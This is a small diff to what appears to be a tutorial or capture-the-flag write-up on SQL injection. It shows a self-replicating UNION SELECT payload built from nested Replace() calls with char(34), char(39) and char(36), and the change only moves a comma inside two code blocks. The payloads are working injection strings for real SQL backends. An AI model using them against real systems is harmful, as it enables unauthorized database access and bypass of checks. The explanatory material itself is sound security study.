@@ -170,8 +170,8 @@ Replace all occurrences of `char(36)` (dollar sign `$` character) with the o
 ```sql
 -- - ' UNION SELECT -- -
 '\' UNION SELECT Replace(Replace(
-\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
-,char(34),char(39)),char(36),
+\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\',
+char(34),char(39)),char(36),
 \'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\')
 %23'
 -- - %23 -- -
@@ -183,8 +183,8 @@ The final result of the query is the string after both replacements, as follows:
 ```sql
 \' UNION SELECT 
 '\' UNION SELECT Replace(Replace(
-\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
-,char(34),char(39)),char(36),
+\'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\',
+char(34),char(39)),char(36),
 \'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
 )%23'
 %23
